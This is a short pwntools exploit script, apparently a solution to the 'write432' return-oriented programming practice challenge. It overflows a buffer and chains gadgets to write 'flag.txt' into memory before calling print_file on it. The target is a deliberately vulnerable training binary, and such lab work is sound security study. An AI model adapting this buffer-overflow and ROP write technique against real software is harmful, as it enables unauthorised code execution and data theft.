from pwn import *

p = process("./write432")

offset = 0x28 + 0x4

write = 0x08048543 # mov [edi], ebp; ret
tgt = 0x0804a018 # buf

ld_tgt_src = 0x080485aa # pop edi; pop ebp; ret

print_file = 0x080483d0

payload = b'E'*offset + p32(ld_tgt_src) + p32(tgt) + b'flag'
payload += p32(write)
payload += p32(ld_tgt_src) + p32(tgt+0x4) + b'.txt'
payload += p32(write)
payload += p32(print_file) + p32(0xdeadc0de) + p32(tgt)

with open("payload.bin", 'wb') as f:
    f.write(payload)

# interactive part
p.recvuntil(">")
p.sendline(payload)

p.interactive()
